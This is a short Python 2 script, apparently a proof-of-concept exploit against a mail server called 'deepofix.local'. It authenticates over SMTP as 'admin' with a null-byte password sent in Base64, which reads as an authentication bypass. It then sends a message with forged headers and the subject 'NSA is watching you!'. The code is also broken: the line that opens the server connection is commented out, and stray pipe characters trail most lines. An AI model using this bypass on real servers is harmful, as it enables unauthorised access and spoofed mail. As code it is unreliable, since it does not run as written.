import smtplib            |
               |
# Select the sender and the receivers        |
sender = 'sender@mail'          |
receivers = ['receiver@mail.com']        |
                |
# Write the message            |
message = """              |
  From: From Sender <sender@mail.com>      |
  To: To Receiver <receiver@mail.com>      |
  Subject: NSA is watching you!        |
                |
  This is a really important message... xD    |
  """              |
                |
# Connect to the SMTP server and send the email    |
try:                |
  # server = smtplib.SMTP('deepofix.local', 25)     |
                |
  # Auth login --> admin/null in Base64      |
  server.docmd("auth login")        |
  server.docmd("YWRtaW4=")        |
  server.docmd("AA==")          |
                |
  server.sendmail(sender, receivers, message)           |
  print "Successfully sent email"        |
                |
except:              |
     print "Error: unable to send email"            |
